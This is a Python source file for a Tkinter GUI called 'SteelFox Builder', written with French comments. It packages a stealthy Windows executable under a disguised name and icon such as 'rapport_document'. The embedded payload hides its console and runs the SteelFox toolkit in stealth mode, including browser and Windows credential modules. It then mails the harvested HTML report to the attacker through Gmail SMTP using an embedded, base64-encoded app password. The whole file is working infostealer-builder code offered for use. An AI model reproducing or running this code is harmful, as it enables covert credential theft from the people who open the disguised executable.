#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SteelFox Builder — Hack Constructor
Génère un exécutable furtif personnalisé (icône, nom) qui lance SteelFox
en mode silencieux et envoie le rapport HTML par e-mail.
"""

from __future__ import annotations

import base64
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import webbrowser
from pathlib import Path
from tkinter import filedialog, messagebox, ttk
import tkinter as tk
from PIL import Image

# ─── Constantes ──────────────────────────────────────────────────────────
ROOT_DIR   = Path(__file__).resolve().parent
ASSETS_DIR = ROOT_DIR / "steelfox" / "assets"

BG        = "#0f0f0f"
BG2       = "#1a1a1a"
BG3       = "#242424"
BORDER    = "#2e2e2e"
ACCENT    = "#e05c00"
ACCENT_HV = "#ff7722"
FG        = "#e8e8e8"
FG_DIM    = "#888888"
FG_LINK   = "#4da6ff"
FONT      = ("Segoe UI", 10)
FONT_BOLD = ("Segoe UI", 10, "bold")
FONT_LG   = ("Segoe UI", 13, "bold")
FONT_SM   = ("Segoe UI", 9)

_EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")


# ─── Template du script généré ────────────────────────────────────────────
# Le payload est un script Python autonome intégré dans l'exécutable produit.
# Il importe directement le package steelfox (copié dans le bundle par PyInstaller)
# et envoie le rapport HTML par e-mail sans jamais afficher de fenêtre console.

_PAYLOAD_TEMPLATE = r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SteelFox — payload furtif généré automatiquement."""

import base64
import os
import smtplib
import sys
import tempfile
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# ─── Furtivité : masquer la fenêtre console ────────────────────────────
def _hide_console() -> None:
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ─── Setup du chemin si build PyInstaller ─────────────────────────────
if getattr(sys, "frozen", False):
    _BASE = sys._MEIPASS
    sys.path.insert(0, _BASE)
else:
    _BASE = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, _BASE)


# ─── Envoi du rapport par e-mail ──────────────────────────────────────
def _send_report(email: str, password: str, report_path: str) -> bool:
    try:
        msg = MIMEMultipart()
        msg["From"]    = email
        msg["To"]      = email
        msg["Subject"] = "SteelFox — Rapport de securite"

        msg.attach(MIMEText(
            "Rapport de reconnaissance joint en piece jointe.\n"
            "— SteelFox Framework",
            "plain",
        ))

        with open(report_path, "rb") as fh:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(fh.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                'attachment; filename="{}"'.format(os.path.basename(report_path)),
            )
            msg.attach(part)

        with smtplib.SMTP("smtp.gmail.com", 587, timeout=30) as srv:
            srv.ehlo()
            srv.starttls()
            srv.login(email, password)
            srv.sendmail(email, email, msg.as_string())

        return True
    except Exception:
        return False


# ─── Point d'entrée ───────────────────────────────────────────────────
def main() -> None:
    _hide_console()

    _email    = "{EMAIL}"
    _password = base64.b64decode("{ENC_PASS}").decode()

    with tempfile.TemporaryDirectory() as tmp:
        # Importer SteelFox directement — pas de sous-processus
        from steelfox.core.config import config
        from steelfox.core.runner import run_steelfox
        from steelfox.core.output import StandardOutput

        config.quiet_mode   = True
        config.stealth_mode = True
        config.st           = StandardOutput()

        for _ in run_steelfox(
            category="all",
            output_dir=tmp,
            output_format="html",
        ):
            pass

        # Retrouver et envoyer le rapport HTML produit
        for fname in os.listdir(tmp):
            if fname.endswith(".html"):
                _send_report(_email, _password, os.path.join(tmp, fname))
                break


if __name__ == "__main__":
    main()
'''


# ─── Widget helpers ───────────────────────────────────────────────────────

def _label(parent: tk.Widget, text: str, **kw) -> tk.Label:
    return tk.Label(parent, text=text,
                    bg=kw.pop("bg", BG2), fg=kw.pop("fg", FG),
                    font=kw.pop("font", FONT), **kw)


def _entry(parent: tk.Widget, **kw) -> tk.Entry:
    return tk.Entry(parent, bg=BG3, fg=FG, insertbackground=FG,
                    relief="flat", highlightthickness=1,
                    highlightbackground=BORDER, highlightcolor=ACCENT,
                    font=FONT, **kw)


def _btn(parent: tk.Widget, text: str, cmd, accent: bool = False, **kw) -> tk.Button:
    bg = ACCENT if accent else BG3
    return tk.Button(
        parent, text=text, command=cmd,
        bg=bg, fg=FG, activebackground=ACCENT_HV, activeforeground=FG,
        relief="flat", padx=12, pady=6, cursor="hand2",
        font=FONT_BOLD if accent else FONT, **kw,
    )


def _separator(parent: tk.Widget) -> tk.Frame:
    return tk.Frame(parent, bg=BORDER, height=1)


# ─── Application principale ───────────────────────────────────────────────

class BuilderApp:
    """Interface graphique du constructeur de payload SteelFox."""

    def __init__(self, root: tk.Tk) -> None:
        self.root = root
        self._custom_icon_path: str | None = None

        self._setup_window()
        self._build_ui()

    # ── Configuration de la fenêtre ──────────────────────────────────────
    def _setup_window(self) -> None:
        self.root.title("SteelFox Builder")
        self.root.geometry("520x660")
        self.root.resizable(False, False)
        self.root.configure(bg=BG)

        icon = ASSETS_DIR / "logo-steel-fox-icon.ico"
        if icon.exists():
            try:
                self.root.iconbitmap(str(icon))
            except Exception:
                pass

        # Style ttk uniquement pour le Combobox
        style = ttk.Style()
        style.theme_use("default")
        style.configure(
            "Dark.TCombobox",
            fieldbackground=BG3, background=BG3,
            foreground=FG, selectbackground=ACCENT,
            selectforeground=FG, arrowcolor=FG_DIM,
            borderwidth=0, relief="flat",
        )
        style.map("Dark.TCombobox", fieldbackground=[("readonly", BG3)])

    # ── Construction de l'interface ──────────────────────────────────────
    def _build_ui(self) -> None:
        root = self.root

        # — En-tête —
        header = tk.Frame(root, bg=BG, pady=18)
        header.pack(fill="x", padx=24)
        tk.Label(header, text="SteelFox  Builder",
                 font=("Segoe UI", 18, "bold"), bg=BG, fg=ACCENT).pack(anchor="w")
        tk.Label(header, text="Constructeur de payload furtif",
                 font=FONT_SM, bg=BG, fg=FG_DIM).pack(anchor="w")

        _separator(root).pack(fill="x")

        # — Corps —
        body = tk.Frame(root, bg=BG2, pady=10)
        body.pack(fill="both", expand=True)

        def section(title: str) -> tk.Frame:
            tk.Label(body, text=title.upper(),
                     font=("Segoe UI", 8, "bold"), bg=BG2, fg=FG_DIM,
                     ).pack(anchor="w", padx=28, pady=(14, 2))
            frm = tk.Frame(body, bg=BG2)
            frm.pack(fill="x", padx=28)
            return frm

        # ── Nom du fichier ──
        f = section("Nom du fichier exécutable")
        self._name_var = tk.StringVar(value="rapport_document")
        _entry(f, textvariable=self._name_var, width=46).pack(fill="x")

        # ── Icône ──
        f = section("Icône")
        icon_row = tk.Frame(f, bg=BG2)
        icon_row.pack(fill="x")

        icons = self._list_icons()
        self._icon_var = tk.StringVar(value=icons[0] if icons else "")
        self._icon_combo = ttk.Combobox(
            icon_row, textvariable=self._icon_var, values=icons,
            state="readonly", style="Dark.TCombobox", width=28,
        )
        self._icon_combo.pack(side="left")
        _btn(icon_row, "Image personnalisée …", self._pick_icon
             ).pack(side="right")
        self._icon_hint = tk.Label(icon_row, text="", font=FONT_SM, bg=BG2, fg=FG_DIM)
        self._icon_hint.pack(side="left", padx=(8, 0))

        # ── E-mail ──
        f = section("Adresse e-mail Gmail (destinataire du rapport)")
        self._email_var = tk.StringVar()
        _entry(f, textvariable=self._email_var, width=46).pack(fill="x")

        # ── Mot de passe d'application ──
        f = section("Mot de passe d'application Google")
        self._pass_var = tk.StringVar()
        _entry(f, textvariable=self._pass_var, show="•", width=46).pack(fill="x")
        lnk = tk.Label(
            f, text="ℹ  Comment obtenir un mot de passe d'application ?",
            font=FONT_SM, bg=BG2, fg=FG_LINK, cursor="hand2",
        )
        lnk.pack(anchor="w", pady=(4, 0))
        lnk.bind("<Button-1>", lambda _: webbrowser.open(
            "https://support.google.com/accounts/answer/185833"))

        # ── Dossier de sortie ──
        f = section("Dossier de sortie de l'exécutable")
        out_row = tk.Frame(f, bg=BG2)
        out_row.pack(fill="x")
        self._outdir_var = tk.StringVar(value=str(ROOT_DIR))
        _entry(out_row, textvariable=self._outdir_var, width=36).pack(side="left")
        _btn(out_row, "…", self._pick_outdir).pack(side="left", padx=(6, 0))

        # — Pied de page —
        _separator(root).pack(fill="x")
        foot = tk.Frame(root, bg=BG, pady=16)
        foot.pack(fill="x", padx=24)

        self._build_btn = _btn(
            foot, "⚙  Construire l'exécutable", self._start_build, accent=True,
        )
        self._build_btn.pack(fill="x")

        self._status_var = tk.StringVar(value="")
        self._status_lbl = tk.Label(
            foot, textvariable=self._status_var,
            bg=BG, fg=FG_DIM, font=FONT_SM, wraplength=470,
        )
        self._status_lbl.pack(pady=(8, 0))

    # ── Icônes disponibles ───────────────────────────────────────────────
    def _list_icons(self) -> list[str]:
        if not ASSETS_DIR.exists():
            return ["(aucun)"]
        icons = sorted(p.stem for p in ASSETS_DIR.glob("*.ico"))
        return icons if icons else ["(aucun)"]

    def _pick_icon(self) -> None:
        path = filedialog.askopenfilename(
            title="Choisir une icône ou une image",
            filetypes=[
                ("Images / Icônes", "*.ico *.png *.jpg *.jpeg *.bmp"),
                ("Tous les fichiers", "*.*"),
            ],
        )
        if path:
            self._custom_icon_path = path
            self._icon_var.set("⭐ " + Path(path).name[:30])
            self._icon_hint.config(text="(personnalisée)")

    def _pick_outdir(self) -> None:
        d = filedialog.askdirectory(
            title="Choisir le dossier de sortie",
            initialdir=self._outdir_var.get(),
        )
        if d:
            self._outdir_var.set(d)

    # ── Validation des champs ─────────────────────────────────────────────
    def _validate(self) -> bool:
        name  = self._name_var.get().strip()
        email = self._email_var.get().strip()
        pwd   = self._pass_var.get().strip()
        out   = self._outdir_var.get().strip()

        if not name:
            messagebox.showerror("Champ manquant", "Veuillez saisir un nom de fichier.")
            return False
        if not _EMAIL_RE.match(email):
            messagebox.showerror("E-mail invalide",
                                 "L'adresse e-mail saisie n'est pas valide.\n"
                                 "Exemple : mon.adresse@gmail.com")
            return False
        if not pwd:
            messagebox.showerror("Champ manquant",
                                 "Veuillez saisir le mot de passe d'application Google.")
            return False
        if not os.path.isdir(out):
            messagebox.showerror("Dossier invalide",
                                 f"Le dossier de sortie est introuvable :\n{out}")
            return False
        return True

    # ── Lancement de la construction (dans un thread) ────────────────────
    def _start_build(self) -> None:
        if not self._validate():
            return
        self._build_btn.config(state="disabled")
        self._set_status("⏳  Construction en cours…", FG_DIM)
        threading.Thread(target=self._build_worker, daemon=True).start()

    def _build_worker(self) -> None:
        """Tourne dans un thread secondaire pour ne pas geler l'interface."""
        name    = self._name_var.get().strip()
        email   = self._email_var.get().strip()
        pwd     = self._pass_var.get().strip()
        out_dir = Path(self._outdir_var.get().strip())

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                tmp = Path(tmpdir)

                self._set_status("📦  Copie des sources SteelFox…", FG_DIM)
                self._copy_steelfox(tmp)

                self._set_status("✍  Génération du payload…", FG_DIM)
                script = tmp / "payload.py"
                script.write_text(self._generate_payload(email, pwd), encoding="utf-8")

                self._set_status("🎨  Traitement de l'icône…", FG_DIM)
                icon_path = self._resolve_icon(tmp)

                self._set_status("🔨  Compilation avec PyInstaller… (peut prendre 1-2 min)", FG_DIM)
                exe = self._pyinstaller_build(tmp, script, name, icon_path)

                dest = out_dir / f"{name}.exe"
                shutil.move(str(exe), str(dest))

            self.root.after(0, self._on_build_success, str(dest))

        except Exception as exc:
            self.root.after(0, self._on_build_error, str(exc))

    # ── Étapes de construction ────────────────────────────────────────────

    def _copy_steelfox(self, tmp: Path) -> None:
        """Copie le package steelfox et steelfox.py dans le dossier de build."""
        src_pkg  = ROOT_DIR / "steelfox"
        src_main = ROOT_DIR / "steelfox.py"

        if not src_pkg.exists():
            raise FileNotFoundError(f"Package SteelFox introuvable : {src_pkg}")
        if not src_main.exists():
            raise FileNotFoundError(f"steelfox.py introuvable : {src_main}")

        shutil.copytree(str(src_pkg), str(tmp / "steelfox"),
                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
        shutil.copy2(str(src_main), str(tmp / "steelfox.py"))

    def _generate_payload(self, email: str, password: str) -> str:
        """Remplace les placeholders EMAIL et ENC_PASS dans le template."""
        enc = base64.b64encode(password.encode()).decode()
        return _PAYLOAD_TEMPLATE.replace("{EMAIL}", email).replace("{ENC_PASS}", enc)

    def _resolve_icon(self, tmp: Path) -> str:
        """Retourne le chemin vers un .ico valide dans le dossier tmp."""
        # Icône personnalisée fournie par l'utilisateur
        if self._custom_icon_path:
            src = Path(self._custom_icon_path)
            if src.suffix.lower() in (".jpg", ".jpeg", ".png", ".bmp"):
                # Conversion image → ICO multi-tailles
                ico_dst = tmp / (src.stem + ".ico")
                img = Image.open(src).convert("RGBA")
                img.save(
                    str(ico_dst), format="ICO",
                    sizes=[(256, 256), (48, 48), (32, 32), (16, 16)],
                )
                return str(ico_dst)
            dst = tmp / src.name
            shutil.copy2(str(src), str(dst))
            return str(dst)

        # Icône prédéfinie sélectionnée dans le Combobox
        stem = self._icon_var.get().lstrip("⭐ ").strip()
        ico  = ASSETS_DIR / f"{stem}.ico"
        if ico.exists():
            dst = tmp / ico.name
            shutil.copy2(str(ico), str(dst))
            return str(dst)

        # Icône de secours
        default = ASSETS_DIR / "logo-steel-fox-icon.ico"
        if default.exists():
            dst = tmp / default.name
            shutil.copy2(str(default), str(dst))
            return str(dst)

        return ""   # PyInstaller accepte l'absence d'icône

    def _pyinstaller_build(
        self, tmp: Path, script: Path, name: str, icon: str,
    ) -> Path:
        """Lance PyInstaller et retourne le chemin du .exe produit."""
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--windowed",                           # aucune console visible
            "--noconfirm",
            "--clean",
            "--name", name,
            "--distpath", str(tmp / "dist"),
            "--workpath", str(tmp / "build"),
            "--specpath", str(tmp),
            "--paths",        str(tmp),             # steelfox/ trouvable
            "--collect-all",  "steelfox",           # tout le package inclus
            "--hidden-import", "steelfox.modules.browsers.chromium",
            "--hidden-import", "steelfox.modules.browsers.firefox",
            "--hidden-import", "steelfox.modules.windows.credentials",
        ]
        if icon:
            cmd += ["--icon", icon]
        cmd.append(str(script))

        result = subprocess.run(cmd, cwd=str(tmp), capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError(
                f"PyInstaller a échoué (code {result.returncode}) :\n"
                + result.stderr[-2000:]
            )

        exe = tmp / "dist" / f"{name}.exe"
        if not exe.exists():
            raise FileNotFoundError(
                f"Exécutable attendu introuvable : {exe}\n"
                + result.stdout[-1000:]
            )
        return exe

    # ── Callbacks UI (appelés depuis le thread principal via root.after) ─
    def _set_status(self, text: str, color: str = FG_DIM) -> None:
        self.root.after(0, lambda: (
            self._status_var.set(text),
            self._status_lbl.config(fg=color),
        ))

    def _on_build_success(self, dest: str) -> None:
        self._build_btn.config(state="normal")
        self._status_var.set(f"✅  Exécutable créé avec succès !")
        self._status_lbl.config(fg="#55dd55")
        messagebox.showinfo("Construction réussie",
                            f"L'exécutable a été créé :\n\n{dest}")

    def _on_build_error(self, msg: str) -> None:
        self._build_btn.config(state="normal")
        self._status_var.set("❌  La construction a échoué.")
        self._status_lbl.config(fg="#ff5555")
        messagebox.showerror("Erreur de construction", msg[:900])


# ─── Point d'entrée ───────────────────────────────────────────────────────

def main() -> None:
    root = tk.Tk()
    BuilderApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()